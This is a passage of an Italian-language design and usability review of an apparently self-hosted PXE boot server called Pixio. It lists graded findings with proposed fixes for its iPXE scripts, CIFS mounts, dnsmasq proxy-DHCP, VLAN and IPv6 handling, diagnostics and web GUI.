  - *Correzione:* 1) embed.ipxe: retry del chain (`set tries:int32 0` / `:chain` / `chain ... && goto done ||` / `inc tries` / `iseq ${tries} 12 && goto failed ||` / `echo Pixio non ancora pronto, riprovo (${tries}/12)...` / `sleep 5` / `goto chain`). 2) nginx (etc/nginx-pixio.conf.tpl): `location = /boot.ipxe { proxy_pass ...; proxy_intercept_errors on; error_page 502 503 504 =200 /pxe/boot/retry.ipxe; }` con /srv/pixio/http/boot/retry.ipxe statico: `#!ipxe` / `echo Pixio sta avviando, attendo 5 secondi...` / `sleep 5` / `chain --autofree http://<ip>/boot.ipxe?${query}` (rigenerato da apply nginx con l'IP). 3) pixio.service: `Wants=pixio-mounts.service` senza `After=` (la GUI parte subito, le sorgenti arrivano quando arrivano; il background già rimonta ogni 60 s), oppure in mount-all montare in parallelo (ThreadPool) con pre-check `socket.create_connection((server,445), timeout=3)` prima del mount, così un file server spento costa 3 s e non 60. 4) Persistere l'elenco delle ISO abilitate e rimontarle in pixio-mounts (helper `remount-enabled` che legge catalog.json), non solo dal thread della GUI.
- **[media] ISO rimossa o sostituita sulla share mentre è montata in loop: loop mount stantio, letture corrotte dopo la riconnessione CIFS** — Il client cifs apre i file con share-delete, quindi Windows lascia cancellare/sovrascrivere un'ISO montata in loop: il loop continua a leggere il vecchio handle (delete-pending) finché non c'è una riconnessione (rete che cade, echo_interval=30 → riconnessione ~60 s), poi le letture danno EIO o, se un file con lo stesso nome è stato sostituito, il loop legge blocchi del nuovo file con i metadati ISO del vecchio → file corrotti serviti da nginx. catalog.py marca `missing` (riga 138) e rileva `changed` (size/mtime, riga 130) ma non chiama mai `umount`/remount; ipxe_menu.entries() esclude `missing` ma la voce con file 'changed' resta nel menu. In più il thread di scansione fa listdir/stat direttamente sul mount CIFS: con share irraggiungibile ogni stat blocca fino al timeout soft (~60 s).
  - *Correzione:* In catalog.scan: quando un'ISO abilitata diventa `missing` o `changed` → `privileged.call('umount-iso', slug)`; se `changed` → mount-detect + redetect + remount automatico e nota nel log «ISO aggiornata sulla share, ricaricata». Prima di scandire una sorgente: probe TCP 445 con timeout 3 s; se fallisce, marcare `error='server non raggiungibile'` e saltare la scansione (niente stat sul mount). Nell'helper, `umount-iso` dopo EIO: usare `umount -l` + `losetup -d` del device residuo (`losetup -j <file>`). Dashboard: contatore 'ISO montate con errori I/O' leggendo `dmesg`/journal per `loop: I/O error` o `CIFS: VFS: ... reconnect`.
- **[media] Share irraggiungibile a runtime: GUI e nginx possono bloccarsi sui thread invece di degradare** — gunicorn gira con `--workers 1 --threads 8`. Le operazioni sul mount CIFS (scan, count, stat per il catalogo) con `soft` non pendono per sempre ma restano bloccate ~2×echo_interval = 60 s (man mount.cifs: «The reconnection happens at twice the value of the echo_interval set for an unresponsive server»): otto richieste che toccano il mount = GUI congelata un minuto, proprio mentre il tecnico vuole capire cosa succede. nginx con `sendfile on; aio threads` serve /pxe/iso/<slug>/ da un loop su CIFS: ogni download in corso occupa un thread del pool (default 32) fino all'EIO. Il rimontaggio automatico (remount_missing ogni 60 s) è buono, ma non c'è un 'circuit breaker'.
  - *Correzione:* 1) Stato 'raggiungibilità' per sorgente aggiornato dal thread di background con probe TCP 445 (3 s) ogni 30 s, salvato in sources.json; le API di stato/catalogo leggono solo il file, mai il mount. 2) Scan sempre in job thread con `concurrent.futures` e timeout per sorgente; mai I/O remoto nei request handler. 3) Considerare `gunicorn --workers 2` (la spec dice 1 worker per il thread di background: usare un lock file per farlo girare in un solo worker). 4) Voci del menu la cui sorgente è 'non raggiungibile' escluse dal menu con riga `item --gap  (sorgente <nome> non raggiungibile)`.
- **[media] VLAN: proxyDHCP funziona solo nella broadcast domain di ens18; nessuna indicazione per reti segmentate** — dnsmasq risponde ai DHCPDISCOVER che vede sull'interfaccia; il DHCP relay (ip helper-address) dello switch L3 inoltra le richieste delle altre VLAN solo al DHCP reale, non a Pixio: i client di VLAN diverse non ricevono mai l'offerta PXE e la GUI mostra 'nessun client' senza spiegare perché. È il caso tipico di una PMI con VLAN uffici/produzione. dnsmasq 2.91 supporta proxy-DHCP insieme al relay (changelog: «Support PXE proxy-DHCP and DHCP-relay at the same time ... The normal DHCP server may be on the local network, but it may also be remote, and accessed via a DHCP relay») e la fase PXE su porta 4011 è unicast verso l'IP di Pixio (changelog 2.76: «force the client to talk to dnsmasq over port 4011»), quindi è instradabile. Confidenza media sul funzionamento con giaddr: da provare, non l'ho testato.
  - *Correzione:* In Impostazioni→Rete aggiungere 'Sottoreti aggiuntive servite (via DHCP relay)' con validazione CIDR; l'helper genera una riga `dhcp-range=<network>,proxy` per ciascuna oltre a quella locale, e la GUI mostra l'istruzione: «Sullo switch/router, per ogni VLAN aggiungere l'IP di Pixio (10.10.0.254) come secondo DHCP relay / ip helper-address, mantenendo quello del DHCP esistente». Alternativa documentata: trunk 802.1q verso Pixio con sottointerfacce (`interface=ens18,ens18.20`). In ogni caso documentare le porte da aprire tra VLAN: udp/67, udp/4011, udp/69, tcp/80, tcp/445 (nftables è installato: 1.1.3-1, ruleset oggi vuoto). Testare la modalità relay in QEMU con due bridge prima di dichiararla supportata.
- **[media] IPv6: PXE solo IPv4, ma iPXE è compilato con NET_PROTO_IPV6 e `dhcp` ha successo anche senza IPv4** — man dnsmasq: «PXE is only supported over IPv4 at this time». ipxe/build.sh definisce `#define NET_PROTO_IPV6`; l'embed usa `dhcp && goto boot ||`. ipxe.org/cmd/ifconf: «ifconf will succeed if any configurator manages to successfully obtain a configuration ... If you want to ensure that both DHCP and IPv6 have succeeded, then you must use each configurator explicitly». In una LAN con Router Advertisement IPv6 (FRITZ!Box, molti router consumer/UniFi lo fanno di default) e DHCPv4 lento (relay, STP), `dhcp` può tornare OK con solo SLAAC: `${next-server}` vuoto, chain verso http://10.10.0.254 senza route IPv4 → fallisce; i 5 retry del loop non aiutano perché `dhcp` 'riesce'. Inoltre `record_seen` e `_ipv4()` in boot.py scartano IP non IPv4 (ok) ma la GUI non dice mai che IPv6-only non è supportato.
  - *Correzione:* embed.ipxe: sostituire `dhcp && goto boot ||` con `ifconf --configurator dhcp --timeout 20000 && goto boot ||` (configuratore solo DHCPv4 su tutte le interfacce), lasciando IPv6 disponibile per usi manuali; in alternativa togliere `NET_PROTO_IPV6` dal build (più semplice, meno rischio). Nella spec e nella pagina Rete scrivere: «Pixio supporta solo PXE su IPv4; l'IPv6 della LAN non viene usato né serve disattivarlo». nginx `listen [::]:80` può restare.
- **[media] ISO da 5 GB su CIFS lento: doppio salto per Windows (CIFS → loop → Samba) e letture random per sanboot senza cache automatica** — Per 'Installazione Windows via rete' WinPE legge sources/install.wim (4–5 GB, e con >4 GB serve la vista UDF, gestita da has_udf) dalla share `pxe` di Samba, che a sua volta legge il loop mount sopra CIFS (`cache=strict`, `rsize` default 4 MB, `actimeo=30`): throughput = min(share remota, LAN)/2 e latenza sommata; con share su NAS/wifi a 100 Mbit si parla di ore per una installazione, e ogni interruzione della share remota corrompe il setup a metà. `sanboot http://.../isofile/<slug>.iso` e memdisk fanno letture Range/casuali sul symlink che punta direttamente al file CIFS. La 'copia locale' esiste (cache_wanted, catalog.py:467 controlla lo spazio) ma è opt-in e non c'è misura della velocità della share.
  - *Correzione:* 1) Default `cache_wanted=true` per i tipi windows, winpe-tool, memdisk, sanboot, ubuntu-casper (le ricette che leggono l'intera ISO): la voce diventa avviabile dalla share subito ma passa alla copia locale appena pronta (il codice ha già il remount post-cache). 2) `test-cifs` dell'helper misura anche il throughput (`smbclient ... -c 'get <iso> /dev/null'` limitato a 64 MB con timeout 20 s) e la GUI mostra «Velocità share: 11 MB/s → ISO da 5 GB ≈ 8 min di copia» e un avviso sotto i 20 MB/s. 3) Con la cache attiva, disabilitare la voce se il file remoto sparisce ma la copia esiste? No: la copia locale deve continuare a funzionare (source='cache') — assicurarsi che `missing` sulla sorgente non disabiliti una ISO in cache. 4) nginx: `sendfile_max_chunk 1m;` in /pxe/ per non far monopolizzare un worker da un singolo client a 5 GB.
- **[media] dnsmasq: rischio residuo di conflitto anche in proxy mode e assenza di self-check dei bind** — In proxy mode il design è corretto (man dnsmasq: «another DHCP server on the network is responsible for allocating IP addresses, and dnsmasq simply provides the information given in --pxe-prompt and --pxe-service»); `port=0`, `interface=ens18`, `bind-dynamic` sono giusti. Restano due modi di fallimento silenziosi: (a) il DHCP esistente già configurato con opzioni 66/67 o con `dhcp-boot` da un altro tentativo PXE (WDS, vecchio server): il firmware riceve due risposte PXE e il comportamento dipende dal vendor; (b) un altro processo che occupa udp/67 o udp/69 sull'host (kea, isc-dhcp-server, tftpd-hpa installati in passato; oggi sulla macchina girano già due dnsmasq, PID 121679 e un'istanza di test 128355 su br-pxetest che lega anche ens18:67): `dnsmasq --test` passa e il restart può fallire o dnsmasq può partire senza il socket 4011 giusto, e in dashboard risulta 'active'.
  - *Correzione:* Aggiungere `GET /api/system/selfcheck` (helper `selfcheck`, sola lettura) eseguito dopo ogni apply e ogni 5 min: (1) `ss -lunpH 'sport = :67 or sport = :4011 or sport = :69'` → deve esserci dnsmasq legato all'interfaccia configurata, nessun altro processo; (2) TFTP loopback `curl tftp://<ip>/undionly.kpxe -o /dev/null --max-time 5`; (3) HTTP `curl http://<ip>/boot.ipxe` deve iniziare con `#!ipxe`; (4) il probe DHCPDISCOVER del punto precedente per rilevare opzioni 66/67 altrui; (5) `nft list ruleset` non vuoto → avviso 'firewall attivo: verificare porte'. Risultato mostrato in dashboard come semaforo con il comando da lanciare a mano per riprodurlo. In install.sh, prima di `apt-get install dnsmasq`, rilevare `isc-dhcp-server`, `kea-dhcp4-server`, `tftpd-hpa` installati/attivi e fermarsi con messaggio chiaro.
- **[bassa] La spec descrive srv-pixio-iso.mount + .automount, il codice fa mount manuale: allineare (e non passare a automount)** — ARCHITECTURE.md: «unità systemd srv-pixio-iso.mount + .automount generate dalla GUI». Il codice invece monta con `mount -t cifs ... -o ...,soft,echo_interval=30,actimeo=30,cache=strict,_netdev,nofail` dall'helper e rimonta ogni 60 s dal background. È la scelta migliore per questa lente: con `.automount` ogni accesso a una share irraggiungibile bloccherebbe il chiamante finché il mount non fallisce (man systemd.mount: `x-systemd.mount-timeout` «can only be used in /etc/fstab, and will be ignored when part of the Options= setting in a unit file»). Nota: `_netdev` e `nofail` passati a mount(8) direttamente sono opzioni userspace di libmount senza effetto qui (innocue, ma fuorvianti nel codice).
  - *Correzione:* Aggiornare la spec: «mount CIFS eseguito dall'helper (soft, echo_interval=30) e supervisionato dal thread di background ogni 60 s; nessuna unit .mount/.automount per evitare blocchi su share irraggiungibile». Togliere `_netdev`/`nofail` dalla lista opzioni in cmd_mount_cifs. Valutare `vers=3.0` minimo di default (oggi negoziato: se il NAS offre solo SMB1 il mount riesce con SMB1, insicuro e lento) con override esplicito dell'utente.
- **[bassa] Voce 'Avvia dal disco locale' con `sanboot --drive 0x80` non affidabile in UEFI; timeout del menu porta lì di default** — ipxe_menu.py: `:local` → `sanboot --no-describe --drive 0x80 || echo Nessun disco avviabile trovato`, e con `timeout=30` e `default=local` ogni PC che fa PXE per errore (ordine di boot) finisce su quella voce. Su BIOS funziona; su UEFI l'avvio del disco locale via sanboot dipende dal firmware, mentre `exit` restituisce il controllo al boot manager che prosegue con la voce successiva (comportamento standard UEFI). Confidenza media: da verificare con OVMF nel test QEMU già previsto.
  - *Correzione:* Per platform=efi generare `:local` → `echo Passo al dispositivo di boot successivo...` / `exit` (e tenere sanboot solo per bios). Aggiungere il caso ai test QEMU (`tests/qemu-pxe-test.sh uefi` con un disco OVMF avviabile). Nella GUI spiegare che il default 'disco locale' con timeout è ciò che rende sicuro lasciare PXE primo nell'ordine di boot.
- **[bassa] smbd con `bind interfaces only = yes` può partire prima che ens18 abbia l'IP (DHCP) e restare solo su lo** — render_smb genera `interfaces = lo ens18` + `bind interfaces only = yes`. Con ifupdown `allow-hotplug` + dhcp, network-online.target può scattare prima del lease (lo stesso motivo per cui pixio-mounts.service ha il loop di attesa sulla default route): smbd si avvia, non trova indirizzi su ens18 e ascolta solo su lo; la share \\pixio\iso 'non risponde' fino al prossimo restart. Anche un cambio di IP (punto 1) lascia smbd legato al vecchio indirizzo.
  - *Correzione:* Rimuovere `bind interfaces only = yes` (mantenere `interfaces = lo ens18` come hint è inutile: lasciare che ascolti su tutte; l'esposizione è la stessa in una LAN di PMI) oppure aggiungere un drop-in `/etc/systemd/system/smbd.service.d/pixio.conf` con `ExecStartPre=/bin/sh -c 'for i in $(seq 30); do ip -4 addr show ens18 | grep -q inet && exit 0; sleep 1; done'`. Il watchdog IP del punto 1 deve fare `apply samba` oltre a dnsmasq.

**Funzioni indispensabili segnalate:**

- Pagina 'Diagnostica' con self-check automatico e ripetibile: IP statico/dinamico, probe DHCPDISCOVER (altri DHCP, opzioni 66/67 altrui), bind di dnsmasq su 67/4011/69, TFTP e HTTP in loopback, firewall nftables, spazio disco, raggiungibilità (TCP 445) di ogni share con throughput misurato.
- Blocco/conferma a due passi per 'DHCP completo' con rilevamento del DHCP esistente e kill switch 'Ferma DHCP di Pixio' in dashboard.
- Watchdog dell'IP del server (confronto iface_ip vs server_ip) con riallineamento automatico di dnsmasq/samba/iPXE e avviso con MAC per la prenotazione DHCP.
- Supporto Secure Boot reale: opzione 'binari iPXE firmati' (ipxeboot.tar.gz ≥ 2.0.0, ipxe-shim.efi + autoexec.ipxe) e rilevamento del client che scarica ipxe.efi senza mai chiedere /boot.ipxe, con messaggio in italiano su cosa fare nel firmware.
- Stima RAM minima per ogni ISO (dal tipo di ricetta e dalle dimensioni dei file) mostrata nel catalogo e nel menu, con verifica lato client via ${memsize} (MEMMAP_SETTINGS) e prompt di conferma.
- Boot degradato ma non muto quando la GUI è giù: retry nello script embedded e retry.ipxe statico servito da nginx su 502/503/504; loop mount ripristinati da pixio-mounts.service, non solo dal thread della GUI.
- Gestione ISO rimossa/sostituita: umount automatico su missing/changed, redetect e remount; nessun I/O sui mount CIFS dai request handler (solo dai job con timeout).
- Cache locale attiva di default per le ricette che leggono l'intera ISO (Windows, WinPE, memdisk, sanboot, Ubuntu casper) con stima del tempo di copia.
- Supporto VLAN: sottoreti aggiuntive con `dhcp-range=<subnet>,proxy` + istruzioni per ip helper-address e tabella porte (udp 67/4011/69, tcp 80/445), testato in QEMU con due bridge.
- Dichiarazione esplicita 'solo IPv4' e embed iPXE con `ifconf --configurator dhcp` per non proseguire senza IPv4.
- Esporta/importa configurazione (config.json + sources + catalogo, con credenziali cifrate o escluse) per ripristino rapido su una Debian pulita: per una PMI il 'server PXE' è spesso una VM che si ricrea.
- Log unificato con evento per client (DISCOVER → TFTP → GET /boot.ipxe → GET /boot/<slug>) e diagnosi automatica del punto in cui il boot si interrompe ('ha scaricato iPXE ma non ha chiesto il menu', 'ha chiesto il menu ma nessun download', 'download interrotto a X MB').

## Critica: Esperienza utente della GUI per un tecnico IT italiano di PMI (schermate, azioni in un click, dashboard, messaggi di errore, wizard primo avvio, anteprima menu iPXE, badge BIOS/UEFI, badge di stato, dark mode, responsive, nessuna CDN). Valutazione su /opt/pixio/docs/ARCHITECTURE.md incrociata con docs/API.md, docs/preview.html e l'implementazione in /opt/pixio/static/*.js, style.css, pixio/services/*.py, data/recipes.json.

La base è solida per una PMI: SPA vanilla senza CDN, italiano coerente, login a primo avvio, catalogo con switch "Nel menu", badge BIOS/UEFI, anteprima script iPXE per piattaforma, dark mode automatica, layout che regge fino a 520px. Il buco principale è che la spec descrive il "cosa" ma non il "come si capisce se funziona": il wizard si ferma prima della scansione e dell'abilitazione (nessuna voce avviabile alla fine), gli errori CIFS arrivano in inglese grezzo dal kernel, e nessuna schermata dice al tecnico perché un PC visto dal DHCP non arriva al menu (Secure Boot, TFTP, IP del server preso via DHCP che può cambiare). Servono un'autodiagnosi in un click, una "verifica" per ISO abilitata e uno stato per client a stadi (DHCP → TFTP → menu → voce).

- **[alta] Il wizard non chiude il ciclo share → scansione → abilita ISO → pronto** — ARCHITECTURE/API prevedono un 'wizard primo avvio quando non ci sono sorgenti né ISO', ma l'implementazione (static/app.js, P.pages.benvenuto) ha 3 passi: (1) form share, (2) pagina informativa su come caricare ISO, (3) testo 'Tutto pronto' con link al catalogo. Dopo 'Aggiungi share e continua' la scansione parte in background (job_id ignorato: `P.post('/api/sources', form)` poi `step = 2`) e il tecnico non vede mai quante ISO sono state trovate né può abilitarne una. Esce dal wizard con 0 voci nel menu e un messaggio 'Tutto pronto' falso: al primo PC avviato vede un menu vuoto.
  - *Correzione:* Aggiungere due passi reali: (3) 'Scansione' che segue il job (P.watchJob su job_id restituito da POST /api/sources o /api/catalog/scan) con barra e contatore 'trovate N ISO, tipo riconosciuto per M'; (4) 'Abilita' con la lista delle ISO trovate (nome, tipo rilevato, badge BIOS/UEFI) e uno switch per riga che chiama PATCH /api/catalog/<slug> {enabled:true}, con pulsante 'Abilita tutte le riconosciute'. Il passo finale 'Pronto' mostra una checklist verde/rossa calcolata da /api/system/status: dnsmasq attivo, iPXE compilato (ipxe.built), nginx attivo, N voci nel menu, e il testo 'Avvia un PC con F12 → Boot da rete'. Il pulsante 'Tutto pronto' deve essere disabilitato finché catalog.enabled == 0, con spiegazione.
- **[alta] Errori di montaggio CIFS mostrati in inglese grezzo, senza causa né rimedio** — helper/pixio-helper riga 161-162: `raise HelperError(f"mount fallito: {p.stderr.strip()...}")`; pixio/services/sources.py salva `str(e)` in source.error e la dashboard lo stampa così com'è (`Sorgente 'X': mount fallito: mount error(13): Permission denied`). Il tecnico vede 'Permission denied' e non sa se è password sbagliata, guest bloccato da Windows (default dal 2018 su Server 2019/Win10 1709+), o versione SMB1 disattivata. Il toast 'bad' sparisce dopo 7 s (app.js P.toast), quindi il testo lungo si perde.
  - *Correzione:* Nel helper mappare i codici di mount.cifs prima di rilanciare: errno 13 → 'Accesso negato: utente/password errati oppure il server non accetta l'accesso guest (inserisci un utente)'; 112/113 → 'Server non raggiungibile: controlla nome/IP e che la porta 445 sia aperta'; 2 → 'Condivisione o cartella inesistente: verifica il percorso UNC'; 95 (EOPNOTSUPP) e 'Operation not supported' → 'Versione SMB non negoziata: prova 2.1 o 3.0 in Versione SMB'; 22 → 'Opzioni non valide'; 5 (EIO) con vers 1.0 → 'SMB1 disattivato sul server'. Restituire {error, hint, raw} e nella GUI mostrare l'errore in un alert persistente nella card Sorgenti con link 'Modifica credenziali' e un expander 'Dettagli tecnici' con il testo raw + ultime 5 righe di `dmesg | grep CIFS`. I toast di tipo 'bad' non devono auto-chiudersi: chiusura manuale o pulsante 'Dettagli'.
- **[alta] Nessuna diagnosi per il caso più frequente: PC visto dal DHCP ma menu mai caricato (Secure Boot / TFTP)** — La spec prevede 'client PXE visti (MAC/IP/arch)'. In pratica il client viene registrato solo quando raggiunge /boot.ipxe (pixio/blueprints/boot.py, record_seen con ?mac=). Un PC con Secure Boot attivo (ipxe.efi non firmato), o con TFTP bloccato, appare nei log dnsmasq ('PXE(ens18) ... proxy') ma mai nella pagina Client: il tecnico vede 'Nessun client' e non ha idea che il server ha risposto. L'unica menzione di Secure Boot è nel passo 3 del wizard e nei warnings della ricetta Windows.
  - *Correzione:* Tracciare lo stadio per MAC: parsare il log dnsmasq (righe 'PXE(<iface>) <mac> <ip> undionly.kpxe|ipxe.efi' e 'sent /srv/pixio/tftp/ipxe.efi to <ip>') e aggiungere al record client `stage: 'dhcp'|'tftp'|'menu'|'entry'` con timestamp. In Client e nella tile dashboard mostrare un pill: 'Risposta DHCP inviata, file non scaricato' → suggerimento 'TFTP bloccato o PC in VLAN diversa'; 'iPXE scaricato ma menu non richiesto' → 'Probabile Secure Boot attivo: disattivalo nel BIOS' (per arch efi64/efi32) oppure 'il PC non raggiunge http://<ip>/boot.ipxe'. Aggiungere una card 'Guida rapida' in Dashboard (contenuto già scritto in docs/preview.html sezione 'Cosa vedi al boot'): tasto di boot (F12/F11/ESC), disattivare Secure Boot, abilitare 'Network stack / PXE IPv4'.
- **[alta] L'IP del server è ottenuto via DHCP: se cambia, tutto smette di funzionare in silenzio** — ARCHITECTURE: 'IP 10.10.0.254/23 (ottenuto via DHCP da 10.10.0.1)'. L'IP è cablato ovunque: script embedded di iPXE con fallback all'IP, URL http://<ip>/pxe/... nelle ricette, share \\<ip>\iso mostrata nel wizard, dhcp-range proxy in dnsmasq. Nessun controllo nella GUI (grep 'statico|reservation' in pixio/ e static/ non trova nulla): al rinnovo lease con IP diverso i client caricano iPXE con un fallback sbagliato e il tecnico vede solo 'Download o avvio fallito'.
  - *Correzione:* In /api/system/status aggiungere `network.ip_source: 'dhcp'|'static'` (leggendo `ip -j addr` → flag 'dynamic' o `networkctl status`) e `ip_mismatch: bool` (server_ip configurato != IP attuale dell'interfaccia). Dashboard: warning persistente 'L'IP 10.10.0.254 è assegnato dal DHCP e può cambiare: crea una prenotazione (reservation) per il MAC xx:xx sul router, oppure imposta un IP statico' con pulsante 'Copia MAC'. Se ip_mismatch: alert rosso 'L'IP del server è cambiato: i client usano ancora 10.10.0.254' con pulsante 'Aggiorna e rigenera' (PUT /api/settings network.server_ip + apply all + rebuild-ipxe).
- **[alta] Manca un'autodiagnosi in un click: il tecnico non può sapere se il server è 'pronto' senza avviare un PC** — La dashboard mostra solo systemd active/inactive (tile 'DHCP proxy + TFTP: Attivo su ens18'). Un dnsmasq attivo ma con TFTP root vuota, ipxe.efi mancante (ipxe.built=false segnalato solo come warning testuale), porta 80 occupata, /boot.ipxe che risponde 500, loop mount fallito: nessuno di questi produce un segnale verde/rosso chiaro. I test della spec (dnsmasq --test, nginx -t, qemu-pxe-test.sh) sono solo da shell.
  - *Correzione:* Pagina/card 'Diagnostica' con pulsante 'Esegui controlli' (POST /api/system/selfcheck → job) che esegue e mostra come lista pass/fail con rimedio: (1) dnsmasq in ascolto su 67/udp e 69/udp sull'interfaccia (ss -lunp); (2) file TFTP presenti: undionly.kpxe, ipxe.efi, ipxe32.efi in /srv/pixio/tftp; (3) download TFTP reale da 127.0.0.1 (`tftp` client o `curl tftp://`) di ipxe.efi; (4) GET http://<server_ip>/boot.ipxe inizia con '#!ipxe' e contiene N voci; (5) per ogni ISO abilitata HEAD dei file della ricetta (kernel, initrd, squashfs, boot.wim) su nginx → 200; (6) spazio disco > 2 GB; (7) smbd se export attivo; (8) modalità proxy: nessun altro DHCP oltre a quello atteso (dnsmasq log 'DHCP packet received' o `nmap --script broadcast-dhcp-discover` opzionale). Ogni riga fallita ha un link diretto alla sezione che la sistema.
- **[media] Le voci 'solo BIOS' o 'solo UEFI' spariscono dal menu senza spiegazione** — pixio/services/ipxe_menu.py riga 71: `ents = [e for e in entries(cfg) if platform in e['platforms']]`. Una ISO generica con ricetta memdisk (platforms ['bios'], data/recipes.json) o ESXi (solo 'efi') è 'Nel menu' nel catalogo ma non compare su un PC dell'altra piattaforma. Nel catalogo i badge BIOS/UEFI usano solo la classe 'y' accesa/spenta (catalog.js platBadges) senza testo né tooltip; nella pagina Menu la lista voci non indica la piattaforma per cui la voce è nascosta.
  - *Correzione:* Badge a tre stati testuali: 'BIOS + UEFI', 'Solo BIOS', 'Solo UEFI', '—' con attributo title che spiega il motivo preso dalla ricetta (es. 'memdisk funziona solo in BIOS'; 'ESXi: boot solo UEFI'). Nella pagina Menu, sotto il toggle UEFI/BIOS, mostrare le voci escluse per quella piattaforma barrate con nota '(nascosta su UEFI)' e un contatore 'N voci non visibili ai PC UEFI'. In /api/menu aggiungere per ogni entry `visible_on: ['bios','efi']`. Nel menu iPXE stesso, opzionale: `item --gap` con testo '— non disponibile su questa piattaforma —' invece di omettere.
- **[media] Abilitare una ISO Windows senza 'Installazione Windows via rete' porta a un setup che non trova install.wim, senza avviso al momento del click** — Il warning esiste in data/recipes.json (warnings_if '!smb_export') ed è mostrato solo nel pannello Dettagli. Lo switch nella riga del catalogo (catalog.js toggleEnabled) abilita e mostra il toast 'aggiunta al menu' senza dire nulla. L'opzione è disattivata di default per requisito (ARCHITECTURE 'Aggiornamento requisiti'). Il tecnico scopre il problema al 90% dell'installazione su un PC.
  - *Correzione:* In toggleEnabled, se iso.type in ('windows') e settings.windows.smb_export_enabled è false: modale 'Per installare Windows via rete serve la share di sola lettura \\<ip>\pxe (WinPE legge install.wim via SMB). Attivarla ora?' con pulsanti 'Attiva e abilita' (PUT /api/settings {windows:{smb_export_enabled:true}} poi PATCH) / 'Abilita comunque' / 'Annulla'. Nel catalogo aggiungere pill 'Setup non trova install.wim' (warn) sulle ISO Windows abilitate finché l'opzione è spenta.
- **[media] 'Rigenera' in dashboard è ambiguo e riavvia servizi senza dirlo** — static/app.js dashboard: pulsante primario 'Rigenera' chiama POST /api/system/apply {what:'all'} che riscrive config dnsmasq/nginx/samba e li riavvia (helper cmd apply). Il tecnico pensa 'rigenera il menu' (che invece è dinamico su /boot.ipxe e non ha bisogno di nulla). Un click durante un'installazione in corso interrompe i download HTTP dei client. Le Impostazioni hanno già 'Riavvia servizi' con conferma (settings.js riga 302) ma la dashboard no.
  - *Correzione:* Rinominare in 'Riapplica configurazione', spostarlo come pulsante secondario (non primary), aggiungere conferma se status.clients.today > 0 o ci sono job 'copy' in corso: 'Riavvia dnsmasq, nginx e Samba. N client attivi oggi potrebbero fallire il boot in corso'. Rendere l'apply incrementale nel backend (riavvio solo del servizio la cui config è cambiata; `nginx -s reload` invece di restart) e mostrare nel toast cosa è stato effettivamente riavviato.
- **[media] Ricetta personalizzata senza esplorazione del contenuto ISO** — Per le ISO 'Sconosciuto' il pulsante 'Ricetta manuale' apre il pannello con campi Kernel/Initrd/Riga di comando (catalog.js righe 60-65). Il tecnico deve conoscere il percorso interno dell'ISO (es. 'casper/vmlinuz'): non c'è modo di vederlo dalla GUI, deve montarla altrove. L'helper ha già cmd_mount_detect che monta la ISO temporaneamente.
  - *Correzione:* Endpoint GET /api/catalog/<slug>/tree?depth=3 (riusa mount_detect, elenca file con dimensione, escludendo >5000 voci) e nel pannello un pulsante 'Sfoglia contenuto ISO' che apre un albero con click-to-insert nei campi Kernel/Initrd; evidenziare automaticamente i candidati (vmlinuz*, initrd*, *.img, *.wim, *.squashfs, memtest*). Aggiungere il pulsante 'Prova ricetta' che genera l'anteprima senza salvare (POST /api/catalog/<slug>/preview {custom_recipe}).
- **[media] Nessuna vista dei job in background e delle copie locali in corso** — API.md espone GET /api/jobs e POST /api/jobs/<id>/cancel, status ha jobs_running:int, ma nessun modulo della SPA li usa (grep '/api/jobs' in static/ trova solo watchJob per singolo job). Una 'Copia locale' di una ISO da 5 GB dalla share è visibile solo aprendo il pannello di quella ISO; una scansione avviata dal timer (scan.auto ogni 10 min) o una compilazione iPXE non compaiono in dashboard. Se il tecnico chiude il browser durante una scansione non c'è modo di seguirla.
  - *Correzione:* Card 'Attività in corso' in Dashboard (e indicatore nella sidebar con badge numerico su jobs_running) che lista i job da GET /api/jobs con tipo tradotto (Scansione, Copia locale di X, Rilevamento, Compilazione iPXE), barra progress, messaggio, pulsante 'Annulla' e per gli ultimi 10 conclusi esito ok/errore con testo errore completo cliccabile. Polling ogni 3 s solo se jobs_running > 0.
- **[media] Dark mode solo automatica, nessun interruttore** — style.css supporta già `:root[data-theme="dark"]` e `:root:not([data-theme="light"])`, ma nessun JS imposta data-theme (grep in static/*.js vuoto). Un tecnico con Windows in tema chiaro ma browser/estensioni in scuro, o che usa la GUI su un monitor in sala server, non può scegliere. Spec: 'Tema chiaro/scuro automatico'.
  - *Correzione:* Nel footer della sidebar (accanto a 'Esci') un selettore a tre stati 'Automatico / Chiaro / Scuro' che imposta `document.documentElement.dataset.theme` e salva in localStorage('pixio.theme'); applicarlo in uno script inline in <head> di index.html prima del CSS per evitare il flash di tema. Verificare il contrasto dei pill 'warn' e dei badge BIOS/UEFI nel tema scuro (WCAG AA 4.5:1) perché la classe 'y' cambia solo il colore.
- **[media] Riordino del menu solo con drag&drop: inutilizzabile da tablet/touch e da tastiera** — static/menu.js gestisce `dragging` con eventi HTML5 drag; su iPad/Android (touch) l'HTML5 DnD non funziona senza polyfill, e da tastiera non c'è alternativa. Il layout responsive esiste (style.css @media 900px/520px) quindi la GUI è raggiungibile da tablet, ma la funzione principale della pagina Menu non lo è.
  - *Correzione:* Aggiungere per ogni voce due pulsanti 'icon-btn' ▲/▼ (e 'Sposta in gruppo…' select) che aggiornano l'ordine e chiamano POST /api/catalog/reorder; supporto tastiera Alt+↑/↓ sulla riga focalizzata. Mantenere il DnD come scorciatoia.
- **[media] Anteprima del menu: solo testo iPXE e un mock limitato al primo gruppo** — La pagina Menu mostra lo script raw (`<pre id=m-preview>`) con toggle UEFI/BIOS e un mock 'Aspetto del menu' che riporta solo il primo gruppo e le prime 3 voci (menu.js righe 40-43: `entries.filter(...).slice(0, 3)`). Il tecnico non vede l'aspetto completo con tutti i gruppi, la voce predefinita evidenziata e il countdown reale; il pulsante 'Anteprima a schermo' previsto in docs/preview.html è diventato 'Apri /boot.ipxe' (testo grezzo in una nuova scheda).
  - *Correzione:* Rendere il mock una riproduzione fedele del menu iPXE: tutte le voci di /api/menu entries filtrate per piattaforma selezionata, separatori dei gruppi (item --gap), voce predefinita selezionata, riga 'Avvio automatico tra N s' coerente con timeout (0 = 'nessun avvio automatico'), pulsante 'Schermo intero' che apre il mock in overlay 1024x768. Tenere il raw script sotto un <details> 'Script iPXE' per chi lo vuole.
- **[media] Nessuna 'verifica' di una ISO abilitata prima di andare al PC** — Lo stato 'Montata' (catalog.js statusPill) dice solo che il loop mount è riuscito. Non verifica che i file della ricetta siano serviti da nginx (permessi, symlink isofile rotto, copia locale non finita) né che il kernel sia raggiungibile. Il tecnico scopre 'Download o avvio fallito' (ipxe_menu.py riga 162) sul PC e deve tornare alla scrivania.
